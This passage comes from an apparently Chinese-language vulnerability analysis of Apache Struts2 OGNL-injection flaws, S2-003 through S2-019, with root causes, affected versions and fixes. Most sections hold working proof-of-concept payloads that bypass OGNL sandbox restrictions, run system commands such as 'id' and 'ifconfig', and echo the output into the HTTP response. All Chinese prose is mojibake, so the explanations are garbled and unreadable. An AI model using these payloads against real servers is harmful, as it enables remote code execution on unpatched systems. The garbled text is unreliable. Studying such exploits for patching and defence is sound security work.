æ‰§è¡Œå‘½ä»¤(c)(('\\u0023dis\\u003dnew\\u0020java.io.DataInputStream(\\u0023ret.getInputStream())')(bla))&amp;(d)(('\\u0023res\\u003dnew\\u0020byte[2000]')(bla))&amp;(e)(('\\u0023dis.readFully(\\u0023res)')(bla))&amp;(f)(('\\u0023writer\\u003d\\u0023context.get(\\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\\').getWriter()')(bla))&amp;(g)(('\\u0023writer.println(new\\u0020java.lang.String(\\u0023res))')(bla))&amp; // è·å–responseï¼Œå›æ˜¾æ•°æ®(h)(('\\u0023writer.flush()')(bla))&amp;(i)(('\\u0023writer.close()')(bla)) è¿™é‡Œpocçš„å…ˆåé¡ºåºç”¨åˆ°äº†ç¬¬ä¸€ä¸ªä½ç½®ï¼Œå®é™…çš„ognlè¡¨è¾¾å¼æ”¾åˆ°äº†ç¬¬äºŒä¸ªä½ç½®(1)((2)(3)) ä¿®å¤xwork&gt;=2.0.6 com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameterså¤šäº†ä»¥ä¸‹ä»£ç  ä½ç‰ˆæœ¬ç”¨çš„ç›´æ¥æ˜¯å·²å­˜åœ¨çš„OgnlValueStackï¼Œä»2.0.6å¼€å§‹ï¼Œä½¿ç”¨äº†ä¸€ä¸ªç©ºçš„stackæ¥å¤„ç†å‚æ•°çš„è§£æ å¹¶ä¸”ä»è¿™ä¸ªç‰ˆæœ¬å¼€å§‹å¤šäº†SecurityMemberAccessï¼Œç”¨æ¥é™åˆ¶ognlè¡¨è¾¾å¼ä¸­å‡½æ•°è°ƒç”¨ åœ¨ognl.OgnlRuntime#callAppropriateMethodè°ƒç”¨å‡½æ•°å‰ï¼Œä¼šå»åˆ¤æ–­å‡½æ•°æ˜¯å¦å¯è¢«è®¿é—®(methodä¸ä¸ºnull) å…¶å®è¿™è¾¹isMethodAccessibleçš„è¿”å›ç»“æœæ— æ‰€è°“ï¼Œä½†æ˜¯ä¸èƒ½åœ¨è¿™ä¸ªå‡½æ•°è°ƒç”¨æ—¶å‡ºé”™ï¼Œå‡ºé”™çš„è¯ä¹Ÿå°±èµ°ä¸åˆ°invokeMethod çœ‹ä¸€ä¸‹å…·ä½“çš„å®ç°ï¼ŒisMethodAccessibleçš„åˆ¤æ–­ä¾èµ–äºSecurityMemberAccess è¿™é‡Œæˆ‘ä»¬ä¸»è¦çœ‹isAcceptableProperty ä¸‹ç«¯ç‚¹è°ƒè¯•ä½ ä¼šå‘ç°è¿™ä¸ªç‰ˆæœ¬acceptPropertiesä¸ºç©ºï¼Œè€ŒexcludePropertieséç©ºï¼Œæ‰€ä»¥åœ¨è°ƒç”¨isExcludeå‡½æ•°æ—¶ï¼Œæ­£åˆ™è°ƒç”¨pattern.matcher(null)ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±æ— æ³•è¾¾åˆ°è°ƒç”¨å‡½æ•°çš„ç›®çš„äº†ï¼ˆpropertiesNameä¸ºnullï¼‰ã€‚ æ‰€ä»¥å¦‚æœè¦ç»•è¿‡è¿™ä¸ªç‰ˆæœ¬çš„é™åˆ¶ï¼Œé¦–å…ˆéœ€è¦è§£å†³çš„æ˜¯è¿™ä¸ªå‡½æ•°çš„æŠ¥é”™é—®é¢˜ï¼Œçœ‹S2-005 3. S2-005å½±å“ç‰ˆæœ¬ï¼šstruts2.0.0 - 2.1.8.1 S2-005ä¸ºS2-003çš„ä¿®å¤ç»•è¿‡ï¼Œç›´æ¥åˆ†æPOC POCåˆ†æ123('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla)(bla)&amp;('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla)(bla)&amp;('\\u0040java.lang.Runtime@getRuntime().exec(\\'open\\u0020/System/Applications/Calculator.app\\')')(bla)(bla) å‰é¢S2-003ä¿®å¤éƒ¨åˆ†è¯´åˆ°äº†éœ€è¦ç»•è¿‡isAcceptablePropertyå‡½æ•°æŠ¥é”™çš„é—®é¢˜æ‰èƒ½ç»§ç»­å¾€ä¸‹è¿›è¡Œå‡½æ•°è°ƒç”¨ã€‚ ä»ä»£ç ä¸Šçœ‹ï¼Œåªè¦excludePropertieså’ŒacceptPropertiesä¸ºç©ºï¼Œå°±ä¸ä¼šè¿›åˆ°æ­£åˆ™åŒ¹é…çš„ç¯èŠ‚ï¼Œæ‰€ä»¥éœ€è¦å°†ä»–ä»¬ç½®ä¸ºç©º pocé‡Œçš„ç¬¬ä¸€è¡Œåšçš„å°±æ˜¯è¿™ä¸ªäº‹æƒ…ï¼Œå°†excludePropertiesç½®ä¸ºç©ºé›†åˆ è¿™é‡Œçœ‹ä¸€ä¸‹ä¸ºä»€ä¹ˆä»¥#_memberAccessçš„æ–¹å¼å¯ä»¥è®¿é—®åˆ°OgnlContextå¯¹è±¡çš„memberAccesså±æ€§ ognl.OgnlContext#get ä»OgnlContextä¸Šä¸‹æ–‡è·å–å†…å®¹ï¼Œé¦–å…ˆä¼šåˆ¤æ–­æ˜¯å¦åœ¨RESERVED_KEYSé›†åˆé‡Œï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ç›¸åº”çš„è°ƒç”¨ä»–çš„gettersï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œåˆ™ä»å½“å‰çš„ä¸Šä¸‹æ–‡é‡Œå»æ‰¾è¿™ä¸ªkeyã€‚ æ‰€ä»¥#_memeberAccesså®é™…è·å–çš„æ˜¯OgnlContextçš„memeberAccesså±æ€§å†…å®¹ è¿˜æœ‰å‡ºç°å˜åŒ–çš„åœ°æ–¹ï¼Œç”±äºç°åœ¨contexté‡Œæ˜¯æ²¡æœ‰responseå¯¹è±¡å¯ä»¥è·å–çš„ï¼Œæ‰€ä»¥åœ¨å¤„ç†å›æ˜¾çš„æ—¶å€™æˆ‘ä»¬éœ€è¦æ‰¾å¦å¤–çš„æ–¹æ³• 12345678910(a)(('\\u0023_memberAccess.excludeProperties\\u003d@java.util.Collections@EMPTY_SET')(bla))&amp;(a)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003dfalse')(bla))&amp;(b)(('\\u0023ret\\u003d@java.lang.Runtime@getRuntime().exec(\\'id\\')')(bla))&amp; // æ‰§è¡Œå‘½ä»¤(c)(('\\u0023dis\\u003dnew\\u0020java.io.DataInputStream(\\u0023ret.getInputStream())')(bla))&amp;(d)(('\\u0023res\\u003dnew\\u0020byte[2000]')(bla))&amp;(e)(('\\u0023dis.readFully(\\u0023res)')(bla))&amp;(f)(('\\u0023writer\\u003d@org.apache.struts2.ServletActionContext@getResponse().getWriter()')(bla))&amp;(g)(('\\u0023writer.println(new\\u0020java.lang.String(\\u0023res))')(bla))&amp; // è·å–responseï¼Œå›æ˜¾æ•°æ®(h)(('\\u0023writer.flush()')(bla))&amp;(i)(('\\u0023writer.close()')(bla)) è¿™é‡Œä½¿ç”¨äº†`@org.apache.struts2.ServletActionContext@getResponse()`é™æ€æ–¹æ³•æ¥è·å–response ä¿®å¤xwork&gt;=2.2.1.1ï¼Œå¯¹å‚æ•°ååšäº†æ›´ä¸ºç»†è‡´çš„æ­£åˆ™æ£€æŸ¥[a-zA-Z0-9\\\\.\\\\]\\\\[\\\\(\\\\)_&#39;\\\\s]+ 4. S2-007è¿™é‡Œè·ŸS2-008é‡Œé¢çš„ç¬¬ä¸€ä¸ªæ¼æ´ä¸€æ · com.opensymphony.xwork2.interceptor.ConversionErrorInterceptor#intercept valueä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ•°æ®ï¼Œè¿‡äº†ä¸€æ¬¡getOverrideExpr å¯¹æˆ‘ä»¬çš„è¾“å…¥å›´ä¸Šäº†å•å¼•å·ï¼Œè¿™é‡Œå¦‚æœæˆ‘ä»¬çš„payloadä¸º&#39;+xxxx+&#39;ï¼Œè¿™é‡Œçš„xxxxå°±é€ƒé€¸å‡ºæ¥äº†ï¼Œè€Œä¸å•å•æ˜¯å­—ç¬¦ä¸²äº† åç»­å°†å¤„ç†å¥½çš„æ•°æ®æ”¾åˆ°äº†stackçš„overridesé‡Œé¢ è€Œå®é™…è§¦å‘çš„åœ°æ–¹è·ŸS2-001ä¸€æ ·ï¼Œæ˜¯åœ¨è§£æJSPçš„æ—¶å€™é€ æˆçš„ åœ¨tryFIndValueå‡½æ•°ä¸­ï¼Œä»stackçš„overridesä¸­å–å‡ºå‰é¢åŠ äº†å•å¼•å·çš„æ•°æ®ï¼Œå¹¶åœ¨åç»­è°ƒç”¨Ognl.getValueï¼Œå¯¼è‡´äº†Ognlè¡¨è¾¾å¼çš„æ‰§è¡Œã€‚ POC1'+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app')) +' xwork&gt;=2.2.3ï¼Œognlè¡¨è¾¾å¼è®¡ç®—æ—¶ï¼Œè°ƒç”¨å‡½æ•°çš„å‡½æ•°åˆ¤æ–­isAcceptablePropertyå¦‚æœnameä¸ºnullç›´æ¥è¿”å›trueï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨åƒs2-005é‚£æ ·æŠŠexcludePropertiesç½®ä¸ºç©ºé›†åˆã€‚ ä½†æ˜¯ä»è¿™é‡Œå¼€å§‹ï¼ŒallowStaticMethodAccessé»˜è®¤ä¸ºfalseï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç½®ä¸ºtrueï¼Œæ‰èƒ½æ­£å¸¸æ‰§è¡Œé™æ€å‡½æ•°ã€‚ æ‰€ä»¥POCç¬¬ä¸€äºŒå¥éƒ½æ˜¯åœ¨è§£é™¤é™åˆ¶ï¼Œç¬¬ä¸‰å¥æ‰§è¡Œå‘½ä»¤ å†™ä¸€ä¸‹å›æ˜¾çš„POC 12345678910111213'+ (#_memberAccess.allowStaticMethodAccess=true,#context['xwork.MethodAccessor.denyMethodExecution']=false,#ret=@java.lang.Runtime@getRuntime().exec('id'),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close()) +' 5. S2-008S2-008ä¸€å…±æœ‰4ä¸ªæ¼æ´ï¼Œè¯¦ç»†çœ‹https://cwiki.apache.org/confluence/display/WW/S2-008 å…¶ä¸­1è·ŸS2-007ç±»ä¼¼ï¼Œ3ä¸çœ‹äº†ï¼Œä¸»è¦å…³æ³¨2å’Œ4 CookieInterceptorè¿™é‡Œçš„åŸç†åŒS2-005ç±»ä¼¼ï¼Œè¿™é‡Œçœ‹ä»£ç æ¯”è¾ƒç›´è§‚ï¼Œæ²¡æœ‰æ­ç¯å¢ƒè°ƒäº† org.apache.struts2.interceptor.CookieInterceptor#intercept è¿™é‡Œä¼šåˆ°OgnlValueStack.setValueï¼Œä¹Ÿå°±æ˜¯åç»­è°ƒç”¨Ognl.setValueï¼Œç”¨((1)(2))(3)çš„æ–¹å¼æ¥æ‰§è¡Œä»»æ„OGNLè¡¨è¾¾å¼ DebuggingInterceptor å½“å¼€å¯å¼€å‘è€…æ¨¡å¼æ—¶ï¼Œä¼ å…¥debug=command&amp;expression=xxxxï¼Œå³å¯æ‰§è¡ŒOGNLè¡¨è¾¾å¼ POC123?debug=command&amp;expression=(%23_memberAccess.allowStaticMethodAccess=true,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))// å›æ˜¾POC(%23_memberAccess.allowStaticMethodAccess=true,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),new java.lang.String(%23res)) 6. S2-009å½±å“èŒƒå›´ï¼š2.0.0 - 2.3.1.1 é’ˆå¯¹S2-005çš„ä¿®å¤ï¼Œå¯¹å‚æ•°åš[a-zA-Z0-9\\\\.\\\\]\\\\[\\\\(\\\\)_&#39;\\\\s]+æ­£åˆ™æ£€æŸ¥ï¼Œè¿™é‡Œè§„é¿äº†å‚æ•°åä¸­å‡ºç°#ã€unicodeç¼–ç ç­‰ S2-009æ˜¯å¯¹S2-005çš„ç»•è¿‡ï¼Œè¿™é‡Œç”¨çš„å°±æ˜¯Ognl.setValueå‡½æ•°çš„å¦ä¸€ç§ç”¨æ³•a[(1)(2)]ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå·§å¦™çš„æ˜¯ï¼Œå‰é¢çš„å‡ ä¸ªæ¼æ´åˆ©ç”¨ï¼Œæˆ‘ä»¬éƒ½æ˜¯ç›´æ¥åœ¨(1)å†™ä¸Šè¦æ‰§è¡Œçš„OGNLè¡¨è¾¾å¼ï¼Œè€ŒS2-009åˆ™é€šè¿‡contexté‡Œçš„å†…å®¹æ¥è¿›è¡Œä¸€ä¸ªä¸­è½¬ï¼Œå°†OGNLè¡¨è¾¾å¼æ”¾åˆ°key=valueçš„valueçš„ä½ç½®ï¼Œå†ç”±a[(key)(2)]çš„æ–¹å¼å»æ‰§è¡Œvalueçš„å†…å®¹ã€‚ 123OgnlContext context = new OgnlContext();context.put(\"test\",\"@java.lang.Runtime@getRuntime().exec(\\'open /System/Applications/Calculator.app/\\')\"); // å‡è®¾contextå­˜åœ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„OGNLè¡¨è¾¾å¼testOgnl.setValue(\"a[(test)(bla)]\",context,\"\");// ä»¥a[(test)(bla)],æ‰§è¡Œtestæ‰€ä»£è¡¨çš„OGNLè¡¨è¾¾å¼ ä¸Šé¢ä»£ç ä¸­çš„å‡è®¾ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥?param=xxxçš„æ–¹å¼å¸¦å…¥ æ³¨æ„è¿™é‡Œçš„paraméœ€è¦æ˜¯å½“å‰Actionçš„ä¸€ä¸ªç±»å±æ€§ï¼ˆä¹Ÿå°±æ˜¯åŸæœ¬å°±å­˜åœ¨çš„å‚æ•°åï¼‰ï¼Œæ¯”å¦‚åŸæœ¬è¡¨å•é‡Œå°±æœ‰passwordï¼Œé‚£ä¹ˆä½ å°±å¯ä»¥åœ¨passwordé‡Œé¢å¡«å……OGNLè¡¨è¾¾å¼ å› ä¸ºåœ¨è®¡ç®—OGNLè¡¨è¾¾å¼(password)(bla)çš„æ—¶å€™(è§£æå‡ºä¸¤ä¸ªASTProperty) åç»­å†æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œä¼šå»æŸ¥æ‰¾å½“å‰çš„actioné‡Œé¢æ˜¯å¦å«æœ‰è¿™ä¸ªå±æ€§ com.opensymphony.xwork2.ognl.accessor.CompoundRootAccessor#getProperty å¦‚æœå½“å‰å­˜åœ¨è¿™ä¸ªå±æ€§çš„æ—¶å€™ï¼Œè¿”å›å…¶å†…å®¹ åç»­å°±æ˜¯è·Ÿ(1)(2)è¿™ç§æ‰§è¡Œçš„åŸç†ä¸€æ ·ï¼Œä¼šä»¥(1)ä½œä¸ºnodeè°ƒç”¨getValueã€‚ è¿™é‡Œå·§å¦™çš„å°±æ˜¯åˆ©ç”¨è¿™ç§ä¸­è½¬çš„æ–¹å¼ï¼Œè§„é¿äº†å‚æ•°åçš„æ­£åˆ™æ£€æµ‹ POC123?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&amp;z[(password)(bla)]=1// å›æ˜¾POC?password=(%23_memberAccess.allowStaticMethodAccess=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&amp;z[(password)(bla)]=1 ä¿®å¤æ”¹è¿›äº†æ­£åˆ™ å¢åŠ äº†setParameterå‡½æ•°ï¼Œé»˜è®¤è®¾ç½®è¡¨è¾¾å¼ä¸å¯æ‰§è¡Œ 7. S2-012å½±å“èŒƒå›´ï¼šStruts Showcase App 2.0.0 - Struts Showcase App 2.3.14.2 The second evaluation happens when redirect result reads it from the stack and uses the previously injected code as redirect parameter.This lets malicious users put arbitrary OGNL statements into any unsanitized String variable exposed by an action and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections. çœ‹æè¿°å¯ä»¥çŸ¥é“æ˜¯struts2åœ¨å¤„ç†redirectçš„æ—¶å€™å‡ºç°çš„é—®é¢˜ã€‚ ç»“æœè¿”å›åå›å»è°ƒç”¨ServletRedirectResultæ¥å¤„ç† æ¥çœ‹çœ‹è¯¥å¯¹è±¡çš„å®é™…å¤„ç†å‡½æ•°org.apache.struts2.dispatcher.ServletRedirectResult#execute åœ¨çˆ¶ç±»executeå‡½æ•°è°ƒç”¨äº†conditionalParseå‡½æ•° è¿™é‡Œå‡ºç°äº†æˆ‘ä»¬æ¯”è¾ƒç†Ÿæ‚‰çš„TextParseUtil.translateVariablesï¼ŒS2-001å°±æ˜¯ç”±è¿™ä¸ªå‡½æ•°æ¥å¤„ç†Stringç±»å‹è½¬åŒ–çš„ã€‚ æ­¤æ—¶paramä¸ºæˆ‘ä»¬åœ¨struts.xmlä¸­çš„é…ç½®edit.action?skillName=${currentSkill.name} å‰é¢åˆ†æè¿‡translateVariablesï¼Œè¿™é‡Œç›´åˆ‡ä¸»é¢˜ å‡ºé—®é¢˜çš„åœ°æ–¹è·ŸS2-001ä¸€æ · è§¦å‘æ€»å…±åˆ†ä¸ºä¸¤æ­¥ï¼š å°†xmlé…ç½®ä¸­${currentSkill.name}è§£ææˆä¼ å…¥çš„å€¼ï¼Œæ­¤æ—¶stack.findValueä¼šå»æ‰¾åˆ°å‰é¢å¤„ç†å¥½åçš„Resulté‡Œé¢çš„currentSkill.nameçš„å€¼ ç”±äºtranslateVariablesçš„è§£æOGNLè¡¨è¾¾å¼æœ‰ä¸¤ç§$ã€%ï¼Œå¹¶ä¸”æ˜¯å¾ªç¯å»å¤„ç†çš„ é¦–å…ˆæ˜¯å»å¤„ç†$ï¼Œå°†${currentSkill.name}è§£ææˆå…·ä½“çš„å€¼ï¼Œå¹¶ä¸”å°†resultçš„å€¼ç½®ä¸ºä»–çš„å†…å®¹ è™½ç„¶å·²ç»ä¿®å¤äº†å¾ªç¯é€’å½’æ‰§è¡Œçš„é—®é¢˜(s2-001ä¼šæ‰§è¡Œä¸¤å±‚${})ï¼Œä½†æ˜¯å› ä¸ºè¿˜å¾ªç¯å»å¤„ç†%ï¼Œé‚£ä¹ˆä»ç„¶å¯ä»¥è¾¾åˆ°å¾ªç¯é€’å½’è®¡ç®—çš„æ•ˆæœ${å¦ä¸€å±‚ä»¥%èµ·å§‹çš„ognlè¡¨è¾¾å¼}ï¼Œæ‰€ä»¥POCé‡Œé¢éœ€è¦ç”¨%{}æ¥å†™å…¥OGNLè¡¨è¾¾å¼ æ‰€ä»¥å¯¹äºS2-012æ¥è¯´ï¼Œé…ç½®ä¸­${currentSkill.name}æ˜¯è‡³å…³é‡è¦çš„ ä¿®å¤ç”±äºæˆ‘å‰é¢åˆ†æçš„æ˜¯2.2.3ç‰ˆæœ¬ï¼Œåç»­çš„ç‰ˆæœ¬çš„translateVariableså˜åŒ–æœ‰ç‚¹å¤§ï¼Œå…¶ä¿®å¤ç‰ˆæœ¬ å¢åŠ äº†posæ¥åšèµ·å§‹ä½ç½®æ¥æŸ¥æ‰¾${}%{}ï¼Œåœ¨ç¬¬ä¸€æ¬¡è¡¨è¾¾å¼æ‰§è¡Œå®Œæˆåä¼šæ›´æ–°poså€¼ï¼Œæ¥é˜²æ­¢äºŒæ¬¡OGNLè¡¨è¾¾å¼æ‰§è¡Œ POC123currentSkill.name=%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,@java.lang.Runtime@getRuntime().exec(&apos;open /System/Applications/Calculator.app&apos;))&#125;// å›æ˜¾POC%&#123;(#_memberAccess[&apos;allowStaticMethodAccess&apos;]=true,#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#ret=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;),#isr=new java.io.InputStreamReader(#ret.getInputStream()),#br=new java.io.BufferedReader(#isr),#res=new char[2000],#br.read(#res),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(new java.lang.String(#res)),#writer.flush(),#writer.close())&#125; 8. S2-013/S2-014å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.14.1 è¿™æ¬¡çš„åŸç†è·ŸS2-001ç±»ä¼¼ï¼Œåªæ˜¯é—®é¢˜å‡ºåœ¨è§£æ&lt;s:a&gt;ã€&lt;s:url&gt;ï¼Œå½“è¿™ä¸¤ä¸ªæ ‡ç­¾æ”¯æŒincludeParams å½“å½“å‰çš„hrefä¸ºç©ºæ—¶ï¼Œä¼šç”¨å½“å‰urlæ¥å¡«å……hrefï¼Œä¹Ÿå°±æ˜¯åœ¨buildUrlæ—¶å¯¼è‡´çš„OGNLè¡¨è¾¾å¼çš„æ‰§è¡Œ è¿™é‡Œä¸å…·ä½“åˆ†æäº†ï¼Œçœ‹ä¸€ä¸‹ä»–çš„æ‰§è¡Œæ ˆ org.apache.struts2.views.util.DefaultUrlHelper#translateVariable ä¹ŸåŒæ ·æ˜¯ä½¿ç”¨Stringè½¬æ¢æ—¶å‡ºç°çš„OGNLè¡¨è¾¾å¼æ‰§è¡Œ POC123?fakeParam=%&#123;(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,@java.lang.Runtime@getRuntime().exec('open /System/Applications/Calculator.app'))&#125;// å›æ˜¾POC?fakeParam=%&#123;(%23_memberAccess['allowStaticMethodAccess']=true,%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23ret=@java.lang.Runtime@getRuntime().exec('id'),%23isr=new java.io.InputStreamReader(%23ret.getInputStream()),%23br=new java.io.BufferedReader(%23isr),%23res=new char[2000],%23br.read(%23res),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(new java.lang.String(%23res)),%23writer.flush(),%23writer.close())&#125; ä¿®å¤ è¿™é‡Œorg.apache.struts2.views.util.DefaultUrlHelperä¸å†ä½¿ç”¨TextParseUtilæ¥å¤„ç† 9. S2-015å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.14.2 S2-015ä¸€å…±æœ‰ä¸¤ç§ï¼š ç¬¬ä¸€ç§æ¼æ´åŸç†è·ŸS2-012ç±»ä¼¼ï¼Œè¿™æ¬¡é—®é¢˜ä¸æ˜¯å‡ºåœ¨é‡å®šå‘ï¼Œè€Œæ˜¯åœ¨è§£æå…·ä½“çš„action nameæ—¶å‡ºç°çš„é—®é¢˜ è¿™é‡Œçš„{1}ä¼šè¢«æ›¿æ¢æˆxxx.actionçš„xxxï¼Œè¿™é‡Œçš„xxxå¦‚æœè¢«æˆ‘ä»¬æ›¿æ¢æˆOGNLè¡¨è¾¾å¼ï¼Œä¼šåœ¨åç»­çš„TextParseUtil.translateVariableså¾—åˆ°æ‰§è¡Œï¼Œè¿‡ç¨‹è·ŸS2-012ä¸€æ ·ï¼Œä¸å†å™è¿°ã€‚ ç¬¬äºŒç§æ˜¯ç»“æœç”±httpheaderæ¥å¤„ç†æ—¶ï¼Œä¼šå°†æˆ‘ä»¬çš„${message}åµŒå¥—æ‰§è¡Œ org.apache.struts2.dispatcher.HttpHeaderResult#execute è·ŸS2-012ä¸€æ ·ï¼Œè§£ææ‰§è¡Œ${å¦ä¸€å±‚ä»¥%èµ·å§‹çš„OGNLè¡¨è¾¾å¼} POC1234// æ‘˜è‡ªhttps://www.freebuf.com/vuls/217482.html%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ifconfig%27%29.getInputStream%28%29%29%2C%23q%7D.action// ç¬¬äºŒç§ï¼Ÿmessage=%&#123;#context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,#m=#_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;ifconfig&apos;).getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125; è¿™é‡Œæ¯”è¾ƒç‰¹æ®Šçš„æ˜¯è¿™é‡Œå¯¹åŸæœ‰#_memberAccess[&#39;allowStaticMethodAccess&#39;]=trueï¼Œæ”¹æˆäº† 1234567// åŸæ¥çš„æ–¹å¼#_memberAccess['allowStaticMethodAccess']=true// é€šè¿‡åå°„æœºåˆ¶æ¥è®¾ç½®#_memberAccess['allowStaticMethodAccess']#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true) ä¸ºä»€ä¹ˆè¦é€šè¿‡è¿™ç§æ–¹å¼æ¥å†™å…¥å‘¢ï¼Ÿ å…ˆæ¥çœ‹OGNLæ˜¯æ€ä¹ˆsetValueçš„ ognl.OgnlRuntime#setFieldValue è€Œæ­¤æ—¶è¿™é‡Œæˆ‘ä»¬è¦è®¾ç½®çš„#_memberAccess[&#39;allowStaticMethodAccess&#39;] æ˜¯finalç±»å‹ï¼Œæˆ‘ä»¬ä¸èƒ½ä½¿ç”¨æ™®é€šçš„æ–¹å¼æ”¹å˜ä»–çš„å€¼ï¼Œåªèƒ½é€šè¿‡ä¸Šé¢çš„åå°„çš„æ–¹å¼æ¥è¿›è¡Œä¿®æ”¹ã€‚ è¿™é‡Œçš„æ”¹å˜æ˜¯ä»struts2 2.3.14.1ç‰ˆæœ¬å¼€å§‹çš„ï¼Œæ„å‘³ç€é«˜äºè¿™ä¸ªç‰ˆæœ¬çš„ä»¥åçš„pocåªèƒ½é€šè¿‡è¿™ç§æ–¹å¼æ¥è®¾ç½® é™¤äº†ä¸Šé¢é€šè¿‡åå°„æœºåˆ¶æ¥è¿›è¡Œç»•è¿‡ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ„é€ å™¨çš„æ–¹æ³•æ¥æ‰§è¡Œï¼Œæ¯”å¦‚new ProccessBuilder(&#39;id&#39;).start() ä¿®å¤è¿™é‡Œçš„ä¿®å¤å°±æ˜¯S2-012çš„ä¿®å¤ï¼Œä¸»è¦ä¿®å¤äº†æ‰§è¡Œè¿™ç§OGNLè¡¨è¾¾å¼${å¦ä¸€å±‚%èµ·å§‹çš„OGNLè¡¨è¾¾å¼} 10. S2-016èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.15 S2-016é—®é¢˜å‡ºåœ¨å¤„ç†é»˜è®¤çš„action:xxxæˆ–redirect:xxxï¼Œåé¢è·Ÿçš„xxxä¸ºOGNLè¡¨è¾¾å¼ï¼ŒStruts2é»˜è®¤å°†ç”¨ServletRedirectResultæ¥å¤„ç†è·³è½¬é—®é¢˜ï¼Œè¿™é‡Œè·ŸS2-012ä¸€æ ·ï¼Œåªæ˜¯è¿™é‡Œçš„è·³è½¬è®¾ç½®åœ¨urlé‡Œé¢ æ‰§è¡Œé“¾è·¯è·ŸS2-012ä¸€æ ·ï¼Œä¸ä½œåˆ†æäº† POC1redirect:%&#123;#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#q),#writer.flush(),#writer.close()&#125; ä¿®å¤org.apache.struts2.dispatcher.mapper.DefaultActionMapperé»˜è®¤çš„redirect/redirectactionç›´æ¥è¢«åˆ é™¤äº† action:éƒ¨åˆ†å› ä¸ºS2-015çš„å…³ç³»ï¼Œé™åˆ¶äº†actionå å·²ç»ä¸æ„æˆå¨èƒäº† 11. S2-019èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.15.1 S2-019è·ŸS2-008çš„ç¬¬äºŒä¸ªæ¼æ´ä¸€æ ·ï¼Œå½“å¼€å¯å¼€å‘è€…æ¨¡å¼æ—¶ï¼Œå…è®¸ä½¿ç”¨commandçš„æ¨¡å¼æ¥æ‰§è¡ŒOGNLè¡¨è¾¾å¼ å…·ä½“çœ‹S2-008 POC1?debug=command&amp;expression=(%23context[&apos;xwork.MethodAccessor.denyMethodExecution&apos;]=false,%23m=%23_memberAccess.getClass().getDeclaredField(&apos;allowStaticMethodAccess&apos;),%23m.setAccessible(true),%23m.set(%23_memberAccess,true),%23q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&apos;id&apos;).getInputStream()),%23writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23writer.println(%23q),%23writer.flush(),%23writer.close()) 